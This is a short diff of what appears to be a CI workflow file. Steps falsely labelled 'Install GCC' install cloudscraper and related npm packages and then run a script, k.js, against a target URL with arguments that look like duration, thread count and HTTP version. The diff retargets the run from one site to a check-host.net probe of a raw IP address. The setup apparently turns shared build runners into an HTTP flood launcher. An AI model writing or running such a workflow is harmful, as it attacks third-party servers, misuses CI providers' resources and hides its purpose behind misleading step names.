@@ -22,4 +22,4 @@ jobs:
       - name: Install GCC
         run: npm install cloudscraper request randomstring
       - name: Install GCC
-        run: node k.js https://doffybee.com/ 300 8 h1
+        run: node k.js https://check-host.net/check-http?host=45.137.70.38:5050 300 8 h1
